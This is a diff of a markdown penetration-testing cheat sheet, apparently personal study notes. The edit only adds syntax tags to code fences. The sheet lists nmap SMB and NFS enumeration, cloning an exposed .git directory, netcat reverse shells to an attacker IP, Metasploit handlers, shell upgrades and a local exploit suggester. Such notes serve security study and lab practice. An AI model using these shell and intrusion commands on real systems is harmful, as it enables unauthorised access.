@@ -3,12 +3,12 @@ Reference Sheets / Notes of techniques learned
 
 ## Enumeration:
 + <b>Samba - Shares & Users</b>
-```
+```bash
 nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 192.168.0.1
 ```
 
 + <b>NFS - Mounts</b>
-```
+```bash
 nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 192.168.0.1
 ```
 
@@ -27,44 +27,44 @@ Open up ZAP/Burpsuite, capture the 302 response, change the status code from 302
 ![image](https://user-images.githubusercontent.com/34889665/120560666-1e5e2680-c3d1-11eb-8d61-7dbd590ab5e5.png)
 + <b>Check for exposed /.git directory</b>
 Clone repository:
-```
+```bash
 wget --mirror -I .git TARGET.COM/.git/ 
 ```
 
 Get files from last commit:
-```
+```bash
 git checkout -- .
 ```
 
 Check out commit log:
-```
+```bash
 git log
 ```
 
 Check out previous commit:
-```
+```bash
 git checkout 123456789
 ```
 
 ## Reverse Shells:
 
 + <b>Netcat - Listener</b>
-```
+```console
 $nc -nvlp 4242
 ```
 
 + <b>Netcat - Connecting to Listener</b>
-```
+```console
 nc -e /bin/sh 192.168.0.1 4242
 ```
 
 + <b>Netcat - Connecting to Listener without `-e`</b>
-```
+```console
 $mknod /tmp/backpipe p
 $/bin/sh 0</tmp/backpipe | nc <attacker_ip> 4242 1>/tmp/backpipe
 ```
 + <b>Metasploit - Listener</b>
-```
+```bash
 msfconsole
 use exploit/multi/handler
 set PAYLOAD windows/shell/reverse_tcp
@@ -78,37 +78,37 @@ run
 ## Upgrading/Stablizing Shells:
 
 + <b>Shell To Meterpreter</b>
-```
+```bash
 (After shell has been backgrounded in Metasploit)
 use post/multi/manage/shell_to_meterpreter
 set SESSION 1
 run
-OR
+(OR)
 sessions -u 1
 ```
 
 + <b>Using Python</b>
 
 *Upgrading:*
-```
+```console
 python -c ‘import pty;pty.spawn(“/bin/bash”)’
 $export TERM=xterm
 ```
 
 *Stablizing:*
-```
+```console
 $^Z
 $stty raw -echo; fg
 (ENTER)
 ```
 ## Post-Meterpreter Shell To-Do's:
 + <b>Background Meterpreter Session</b>
-```
+```console
 ^Z
 Y
 ```
 + <b>Use Local Exploit Suggester</b>
-```
+```bash
 use post/multi/recon/local_exploit_suggester
 set SESSION 1
 run
